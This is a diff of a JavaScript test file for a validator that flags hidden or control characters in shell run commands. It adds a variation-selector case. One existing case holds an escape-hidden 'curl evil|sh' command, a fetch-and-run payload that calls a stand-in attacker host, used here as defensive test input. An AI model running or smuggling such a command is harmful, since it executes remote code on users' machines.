@@ -139,6 +139,7 @@ try {
     ['raw tag character in run', run('npm test\u{E0041}'), 6, 'hidden_character'],
     ['raw U+2028 in run', run('npm\u2028test'), 6, 'hidden_character'],
     ['raw noncharacter in run', run('npm test\uFFFF'), 6, 'hidden_character'],
+    ['raw variation selector in run (default-ignorable, not a format character)', run('npm\uFE0Ftest'), 6, 'hidden_character'],
     ['raw C1 U+0085', run('npm test\u0085'), 6, 'control_character'],
     ['raw C1 U+009B', run('npm test\u009B2K'), 6, 'control_character'],
     ['escaped ESC and CR', run('"npm test\\e[2K\\rcurl evil|sh"'), 6, 'hidden_character'],
